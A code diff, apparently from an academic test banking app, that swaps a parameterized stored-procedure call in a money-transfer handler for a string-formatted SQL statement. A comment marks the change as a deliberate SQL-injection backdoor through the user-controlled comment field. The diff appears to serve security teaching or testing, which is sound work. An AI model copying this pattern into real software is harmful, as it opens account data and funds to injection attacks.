@@ -1,7 +1,6 @@
 package br.usp.larc.nanoib.handlers;
 
 import java.io.IOException;
-import java.sql.CallableStatement;
 import java.sql.Connection;
 import java.sql.SQLException;
 
@@ -46,16 +45,18 @@ public class TransferRequestHandler extends RequestHandler {
         try {
             TransferRequestBean trb = TransferRequestBean.fromJsonString(getBodyAsString(input)); 
             
-            CallableStatement stmnt = dBConn.prepareCall("call transfer(?,?,?,?,?,?)");
-
-            stmnt.setLong(1, tenant.accBranchId);
-            stmnt.setLong(2, tenant.accId);
-            stmnt.setLong(3, trb.destAccBranchId);
-            stmnt.setLong(4, trb.destAccId);
-            stmnt.setBigDecimal(5, trb.value);
-            stmnt.setString(6, trb.comment);
+            //backdoor: SQL injection (on purpose)
+            boolean result = dBConn.createStatement().execute(
+                    String.format(
+                            "call transfer(%d,%d,%d,%d,%s,'%s')",
+                            tenant.accBranchId, tenant.accId,
+                            trb.destAccBranchId, trb.destAccId,
+                            trb.value.toString(),
+                            trb.comment
+                        )
+                    );
             
-            if (stmnt.execute()) {
+            if (result) {
                 response = new Response(Status.OK, "application/json", null, 0);
             } else {
                 response = new Response(Status.INTERNAL_ERROR, null, null, 0);
